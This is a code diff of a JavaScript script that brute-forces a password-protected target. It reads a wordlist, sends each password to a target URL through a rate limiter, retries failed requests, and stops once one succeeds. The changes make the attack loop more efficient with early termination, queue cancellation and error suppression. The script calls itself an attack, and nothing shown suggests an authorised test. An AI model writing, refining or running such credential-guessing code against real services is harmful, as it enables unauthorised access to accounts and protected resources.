@@ -41,28 +41,52 @@ async function checkPassword(password) {
 
 //Attack function:
 async function startAttack() {
-    const passwords = fs.readFileSync('dict.txt', 'utf-8').split('\n');
+    const passwords = fs.readFileSync('dict.txt', 'utf-8').split('\n').filter(p => p.trim() !== '');
     console.log(`Trying ${passwords.length} passwords. Target: ${TARGET_URL}`);
 
     const wrappedCheck = limiter.wrap(checkPassword);
     let successfullURL = null;
+    let attackComplete = false; 
 
-    const promises = passwords.map (async (password) => {
-        if (!password || successfullURL); //Need to skiup if empty or already used.
+    //Queue all password checks immediately:
+    const promises = passwords.map((password) => {
+        // Only queue the password check if we haven't already succeeded
+        if (attackComplete) return null;
 
-        const result = await wrappedCheck(password);
+        return wrappedCheck(password)
+            .then(result => {
+                if (result?.success) {
+                    //Set success flags
+                    successfullURL = result.url;
+                    attackComplete = true; 
+                    // Cancel remaining jobs in Bottleneck queue.
+                    limiter.stop(); 
+                }
 
-        if (result?.success) successfullURL = result.url;
-
-        if (result?.retry) {
-            //Queue the failed request
-            wrappedCheck(result.password).then(res => {
-                if (res?.success) successfullURL = res.url;
+                if (result?.retry && !attackComplete) {
+                    // Queue the failed request back
+                    return wrappedCheck(result.password)
+                        .then(res => {
+                            if (res?.success) {
+                                successfullURL = res.url;
+                                attackComplete = true;
+                                limiter.stop();
+                            }
+                        });
+                }
+                return result;
+            })
+            .catch(e => {
+                // Suppress the expected limiter has been stopped error
+                if (e.message && e.message.includes("limiter has been stopped")) {
+                    // Do nothing
+                } else {
+                    console.error("An unexpected error occurred during password queueing:", e);
+                }
             });
-        }
     });
 
-    await Promise.all(promises);
+    await Promise.all(promises.filter( p => p !== null)); //Must filter out the nuls because of the early exit.
 
     if (successfullURL) {
         console.log('Attack finished. URL: ', successfullURL);
